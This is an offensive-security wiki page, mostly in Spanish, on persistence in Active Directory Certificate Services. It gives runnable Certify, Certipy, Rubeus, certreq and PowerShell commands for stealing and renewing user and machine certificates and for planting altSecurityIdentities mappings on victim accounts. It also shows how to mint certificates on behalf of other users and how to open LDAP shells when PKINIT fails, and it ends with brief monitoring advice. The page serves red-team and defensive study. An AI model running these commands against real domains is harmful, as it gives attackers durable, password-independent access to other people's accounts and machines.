# AD CS Account Persistence

{{#include ../../../banners/hacktricks-training.md}}

**Este es un pequeño resumen de los capítulos de persistencia de cuentas de la increíble investigación de [https://specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf)**

## Understanding Active User Credential Theft with Certificates – PERSIST1

En un escenario en el que un certificado que permite autenticación de dominio puede ser solicitado por un usuario, un atacante tiene la oportunidad de solicitar y robar este certificado para mantener persistencia en una red. Por defecto, la plantilla `User` en Active Directory permite tales solicitudes, aunque a veces puede estar deshabilitada.

Usando [Certify](https://github.com/GhostPack/Certify) o [Certipy](https://github.com/ly4k/Certipy), puedes buscar plantillas habilitadas que permitan autenticación de cliente y luego solicitar una:
```bash
# Enumerate client-auth capable templates
Certify.exe find /clientauth

# Newer Certify 2.0 syntax with filtering to enabled client-auth templates
Certify.exe enum-templates --filter-enabled --filter-client-auth --hide-admins

# Request a user cert from an Enterprise CA (current user context)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User

# Using Certipy (RPC/DCOM/WebEnrollment supported). Saves a PFX by default
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' -template 'User' -out user.pfx
```
El poder de un certificado reside en su capacidad para autenticarse como el usuario al que pertenece, independientemente de los cambios de contraseña, siempre que el certificado siga siendo válido.

Puedes convertir PEM a PFX y usarlo para obtener un TGT:
```bash
# Convert PEM returned by Certify to PFX
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

# Use certificate for PKINIT and inject the TGT
Rubeus.exe asktgt /user:john /certificate:C:\Temp\cert.pfx /password:CertPass! /ptt

# Or with Certipy
certipy auth -pfx user.pfx -dc-ip 10.0.0.10
```
> Note: Combinado con otras técnicas (ver secciones THEFT), la autenticación basada en certificados permite acceso persistente sin tocar LSASS e incluso desde contextos no elevados.

## Obtener persistencia de máquina con certificados - PERSIST2

Si un atacante tiene privilegios elevados en un host, puede inscribir la cuenta de máquina del sistema comprometido para un certificado usando la plantilla predeterminada `Machine`. Autenticarse como la máquina habilita S4U2Self para servicios locales y puede proporcionar persistencia duradera en el host:
```bash
# Request a machine certificate as SYSTEM
Certify.exe request /ca:dc.theshire.local\theshire-DC-CA /template:Machine /machine

# Authenticate as the machine using the issued PFX
Rubeus.exe asktgt /user:HOSTNAME$ /certificate:C:\Temp\host.pfx /password:Passw0rd! /ptt
```
## Extender la persistencia mediante la renovación de certificados - PERSIST3

Abusar de los períodos de validez y renovación de las plantillas de certificados permite a un atacante mantener acceso a largo plazo. Si posees un certificado emitido previamente y su clave privada, puedes renovarlo antes de que expire para obtener una credencial nueva y de larga duración sin dejar artefactos adicionales de solicitud vinculados al principal original.
```bash
# Renewal with Certipy (works with RPC/DCOM/WebEnrollment)
# Provide the existing PFX and target the same CA/template when possible
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -pfx user_old.pfx -renew -out user_renewed.pfx

# Native Windows renewal with certreq
# (use the serial/thumbprint of the cert to renew; reusekeys preserves the keypair)
certreq -enroll -user -cert <SerialOrID> renew [reusekeys]
```
> Consejo operativo: realiza seguimiento de las caducidades de los archivos PFX controlados por el atacante y renuévalos con antelación. La renovación también puede hacer que los certificados actualizados incluyan la extensión moderna de mapeo de SID, manteniéndolos utilizables bajo reglas de mapeo más estrictas del DC (ver la siguiente sección).

## Planting Explicit Certificate Mappings (altSecurityIdentities) – PERSIST4

Si puedes escribir en el atributo `altSecurityIdentities` de una cuenta objetivo, puedes mapear explícitamente un certificado controlado por el atacante a esa cuenta. Esto persiste a través de cambios de contraseña y, al usar formatos de mapeo fuertes, sigue siendo funcional bajo la aplicación moderna del DC.

Flujo de alto nivel:

1. Obtén o emite un certificado de client-auth que controles (por ejemplo, inscribe la plantilla `User` como tú mismo).
2. Extrae un identificador fuerte del cert (Issuer+Serial, SKI, o SHA1-PublicKey).
3. Añade un mapeo explícito en `altSecurityIdentities` del principal víctima usando ese identificador.
4. Autentícate con tu certificado; el DC lo mapea a la víctima mediante el mapeo explícito.

Ejemplo (PowerShell) usando un mapeo fuerte Issuer+Serial:
```powershell
# Example values - reverse the issuer DN and serial as required by AD mapping format
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'
$SerialR = '1200000000AC11000000002B' # reversed byte order of the serial
$Map     = "X509:<I>$Issuer<SR>$SerialR"

# Add mapping to victim. Requires rights to write altSecurityIdentities on the object
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
Entonces autentica con tu PFX. Certipy obtendrá un TGT directamente:
```bash
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10

# If PKINIT is unavailable on the DC, reuse the same persisted cert via Schannel/LDAPS
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell
```
### Construyendo mappings fuertes de `altSecurityIdentities`

En la práctica, los mappings **Issuer+Serial** y **SKI** son los formatos fuertes más fáciles de construir a partir de un certificado en manos del atacante. Esto importa después del **11 de febrero de 2025**, cuando los DCs pasan por defecto a **Full Enforcement** y los mappings débiles dejan de ser fiables.
```bash
# Extract issuer, serial and SKI from a cert/PFX
openssl pkcs12 -in attacker_user.pfx -clcerts -nokeys -out attacker_user.crt
openssl x509 -in attacker_user.crt -noout -issuer -serial -ext subjectKeyIdentifier
```

```powershell
# Example strong SKI mapping for a user or computer object
$Map = 'X509:<SKI>9C4D7E8A1B2C3D4E5F60718293A4B5C6D7E8F901'
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
# Set-ADComputer -Identity 'WS01$' -Add @{altSecurityIdentities=$Map}
```
Notas
- Usa solo tipos de mapeo fuertes: `X509IssuerSerialNumber`, `X509SKI` o `X509SHA1PublicKey`. Los formatos débiles (Subject/Issuer, Subject-only, RFC822 email) están deprecados y pueden ser bloqueados por la política del DC.
- El mapeo funciona tanto en objetos **user** como **computer**, así que el acceso de escritura al `altSecurityIdentities` de una cuenta de computadora es suficiente para persistir como esa máquina.
- La cadena de certificados debe construirse hasta una raíz confiada por el DC. Las Enterprise CAs en NTAuth normalmente son confiadas; algunos entornos también confían en public CAs.
- La autenticación Schannel sigue siendo útil para persistence incluso cuando PKINIT falla porque el DC carece del Smart Card Logon EKU o devuelve `KDC_ERR_PADATA_TYPE_NOSUPP`.

#### 2025+ `Issuer/SID` explicit mappings

En domain controllers **Windows Server 2022+** parcheados con la actualización de seguridad del **9 de septiembre de 2025**, Microsoft añadió otro formato fuerte de explicit mapping que resulta atractivo para persistence porque sobrevive a la reemisión del certificado desde la misma CA:
```powershell
# Same issuer formatting rules as Issuer+Serial
$Issuer = 'DC=corp,DC=local,CN=CORP-DC-CA'
$SID    = 'S-1-5-21-1111111111-2222222222-3333333333-1105'
$Map    = "X509:<I>$Issuer<SID>$SID"
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
Operativamente, esto difiere de los formatos fuertes más antiguos:
- `Issuer+Serial` fija **un certificado exacto**.
- `SKI` / `SHA1-PUKEY` fija **un par de claves**.
- `Issuer/SID` fija la **CA emisora + el SID objetivo**, por lo que los certificados renovados o reemitidos de la misma CA siguen funcionando sin reescribir `altSecurityIdentities`.

Requisitos y advertencias
- El certificado presentado para el logon debe contener realmente el SID de la cuenta objetivo en la extensión de seguridad SID.
- Este formato no es útil para certificados estilo `ESC9` / `ESC16` que omiten la extensión SID; en esos casos, usa `Issuer+Serial`, `SKI` o `SHA1-PUKEY`.

Para más sobre weak explicit mappings y rutas de ataque, ver:


{{#ref}}
domain-escalation.md
{{#endref}}

## Enrollment Agent como Persistence – PERSIST5

Si obtienes un certificado válido de Certificate Request Agent/Enrollment Agent, puedes generar nuevos certificados capaces de logon en nombre de usuarios a voluntad y mantener el PFX del agente offline como token de persistence. Flujo de abuso:
```bash
# Request an Enrollment Agent cert (requires template rights)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:"Certificate Request Agent"

# Mint a user cert on behalf of another principal using the agent PFX
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User \
/onbehalfof:CORP\\victim /enrollcert:C:\Temp\agent.pfx /enrollcertpw:AgentPfxPass

# Or with Certipy
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -on-behalf-of 'CORP/victim' -pfx agent.pfx -out victim_onbo.pfx
```
La revocación del certificado del agente o de los permisos de la plantilla es necesaria para expulsar esta persistencia.

Notas operativas
- Las versiones modernas de `Certipy` soportan tanto `-on-behalf-of` como `-renew`, por lo que un atacante que tenga un Enrollment Agent PFX puede emitir y luego renovar certificados leaf sin volver a tocar la cuenta objetivo original.
- Si la obtención de TGT basada en PKINIT no es posible, el certificado on-behalf-of resultante sigue siendo usable para autenticación Schannel con `certipy auth -pfx victim_onbo.pfx -dc-ip 10.0.0.10 -ldap-shell`.

## Usar certificados persistidos cuando PKINIT falla

Si el DC no tiene un certificado compatible con Smart Card Logon, el inicio de sesión con certificado mediante PKINIT puede fallar con `KDC_ERR_PADATA_TYPE_NOSUPP`. Eso no elimina el primitive de persistencia: el mismo PFX a menudo sigue siendo usable para acceso LDAP autenticado con Schannel.
```bash
# LDAPS / Schannel shell as the mapped principal
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell

# LDAP StartTLS fallback if 636 is filtered but 389/TLS is reachable
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell -ldap-scheme ldap -ldap-port 389
```
Esto es especialmente útil después de PERSIST4/PERSIST5 porque puedes seguir operando desde Linux/macOS y encadenar otras acciones de persistencia en el directorio, como soltar [shadow credentials](../acl-persistence-abuse/shadow-credentials.md) o editar atributos de delegación escribibles.

## 2025 Strong Certificate Mapping Enforcement: Impact on Persistence

Microsoft KB5014754 introdujo Strong Certificate Mapping Enforcement en los domain controllers. Desde el **11 de febrero de 2025**, los DCs usan por defecto **Full Enforcement** para mapeos débiles/ambiguos, y a partir de la actualización de seguridad del **9 de septiembre de 2025** los DCs parcheados ya no soportan el antiguo fallback en modo Compatibility. Implicaciones prácticas:

- Los certificados anteriores a 2022 que no tengan la extensión de mapeo SID pueden fallar en el mapeo implícito cuando los DCs están en Full Enforcement. Los atacantes pueden mantener acceso renovando los certificados a través de AD CS (para obtener la extensión SID) o plantando un mapeo explícito fuerte en `altSecurityIdentities` (PERSIST4).
- Los mapeos explícitos que usan formatos fuertes (`Issuer+Serial`, `SKI`, `SHA1-PUKEY` y, en DCs modernos, `Issuer/SID`) siguen funcionando. Los formatos débiles (Issuer/Subject, Subject-only, RFC822) pueden ser bloqueados y deben evitarse para persistencia.
- Si los mapeos débiles aún parecen funcionar, asume que has encontrado un DC sin parchear o con una configuración diferente, no una ruta fiable de persistencia a largo plazo.
- Las rutas de emisión estilo `ESC9` / `ESC16` que suprimen la extensión SID hacen que `Issuer/SID` no sea usable, por lo que los mapeos fuertes alternativos o la renovación mediante una plantilla normal se convierten en la opción práctica de persistencia.

Los administradores deberían monitorizar y alertar sobre:
- Cambios en `altSecurityIdentities` y emisiones/renovaciones de certificados de Enrollment Agent y User.
- Logs de emisión de la CA para solicitudes on-behalf-of y patrones inusuales de renovación.

## References

- [Microsoft Support – KB5014754: Certificate-based authentication changes on Windows domain controllers](https://support.microsoft.com/en-us/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16)
- [SpecterOps – ADCS ESC14 Abuse Technique](https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/)
- [GhostPack/Certify Wiki – Account Persistence Techniques](https://github.com/GhostPack/Certify/wiki/2-%E2%80%90-Account-Persistence-Techniques)
- [Certipy Wiki – Command Reference](https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference)
- [Almond Offensive Security – Authenticating with certificates when PKINIT is not supported](https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html)
- [Microsoft Community Hub – Introducing a new Issuer/SID AltSecID](https://techcommunity.microsoft.com/blog/publicsectorblog/introducing-a-new-issuersid-altsecid/4454231)

{{#include ../../../banners/hacktricks-training.md}}
